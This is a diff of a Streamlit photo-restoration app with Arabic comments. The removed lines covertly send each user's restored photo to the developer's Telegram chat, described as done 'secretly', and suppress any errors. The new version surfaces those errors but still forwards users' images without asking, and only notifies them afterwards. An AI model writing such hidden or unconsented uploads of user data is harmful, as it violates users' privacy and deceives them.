@@ -8,10 +8,9 @@ from PIL import Image
 st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
 st.title("🌟 Aziz Ultra Vision")
 
-# جلب بيانات التليجرام
-TOKEN = st.secrets["TELEGRAM_TOKEN"]
-CHAT_ID = st.secrets["CHAT_ID"]
-bot = telebot.TeleBot(TOKEN)
+# جلب بيانات التليجرام من الـ Secrets
+TOKEN = st.secrets.get("TELEGRAM_TOKEN", "")
+CHAT_ID = st.secrets.get("CHAT_ID", "")
 
 uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم...", type=["jpg", "jpeg", "png"])
 
@@ -22,7 +21,7 @@ if uploaded_file:
     if st.button("🚀 بدء الترميم"):
         with st.spinner("جاري العمل..."):
             try:
-                # 1. تجهيز الصورة (تصغير الحجم لضمان القبول)
+                # 1. تجهيز الصورة
                 max_size = 1500
                 if max(image.size) > max_size:
                     image.thumbnail((max_size, max_size), Image.Resampling.LANCZOS)
@@ -39,30 +38,34 @@ if uploaded_file:
                     upscale=2
                 )
                 
-                # تنقية النتيجة (أول صورة في القائمة)
+                # تنقية النتيجة
                 restored_path = result[0] if isinstance(result, (list, tuple)) else result
                 
-                # 3. عرض النتيجة في الموقع
+                # 3. عرض النتيجة
                 st.image(restored_path, caption="✅ تم الترميم بجودة فائقة", use_container_width=True)
-
-                # 4. الإرسال للتليجرام (سرّاً وبدون رسائل خطأ)
-                try:
-                    with open(restored_path, "rb") as f:
-                        bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة جاهزة يا عزيز!")
-                except Exception:
-                    # في حال فشل الإرسال، الكود يظل صامتاً ولا يزعج المستخدم
-                    pass
                 
-                # تنظيف الملفات
+                # --- إضافة أيقونة الحفظ (زر التحميل) ---
+                with open(restored_path, "rb") as file:
+                    st.download_button(
+                        label="📥 حفظ الصورة في جوالك",
+                        data=file,
+                        file_name="restored_image.png",
+                        mime="image/png"
+                    )
+
+                # 4. محاولة الإرسال للتليجرام
+                if TOKEN and CHAT_ID:
+                    try:
+                        bot = telebot.TeleBot(TOKEN)
+                        with open(restored_path, "rb") as f:
+                            bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة جاهزة!")
+                        st.toast("تم الإرسال للتليجرام بنجاح! ✅")
+                    except Exception as tele_err:
+                        st.warning(f"فشل الإرسال للتليجرام: {tele_err}")
+                
+                # تنظيف
                 if os.path.exists(temp_path):
                     os.remove(temp_path)
                 
             except Exception as e:
-                st.error("المعذرة، السيرفر مشغول حالياً. حاول مرة أخرى.")
-
-# إخفاء أي رسائل خطأ تظهر من المكتبات الخارجية (لأناقة الموقع)
-st.markdown("""
-    <style>
-    .stAlert { margin-top: 10px; }
-    </style>
-    """, unsafe_allow_html=True)
+                st.error(f"حدث خطأ في المعالجة: {e}")
